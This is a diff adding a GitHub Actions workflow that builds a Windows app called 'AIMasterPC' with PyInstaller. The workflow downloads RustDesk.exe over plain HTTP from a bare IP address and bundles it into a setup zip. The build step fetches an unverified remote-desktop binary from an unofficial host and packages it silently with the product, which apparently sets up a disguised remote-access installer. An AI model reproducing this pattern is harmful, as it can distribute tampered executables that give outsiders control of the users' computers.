@@ -1,0 +1,47 @@
+name: Build Windows EXE
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.11'
+    
+    - name: Install dependencies
+      run: |
+        pip install requests pyinstaller pillow
+    
+    - name: Download RustDesk
+      run: |
+        Invoke-WebRequest -Uri "http://185.23.238.149/rustdesk/RustDesk.exe" -OutFile "RustDesk.exe"
+      shell: powershell
+    
+    - name: Build EXE
+      run: |
+        pyinstaller --onefile --windowed --name "AIMasterPC" --icon=NONE ai_masterpc.py
+      
+    - name: Package with RustDesk
+      run: |
+        copy dist\AIMasterPC.exe AIMasterPC.exe
+        copy RustDesk.exe RustDesk.exe
+        Compress-Archive -Path AIMasterPC.exe, RustDesk.exe -DestinationPath AIMasterPC_Setup.zip
+      shell: powershell
+    
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: AIMasterPC-Windows
+        path: |
+          AIMasterPC.exe
+          AIMasterPC_Setup.zip
+        retention-days: 30
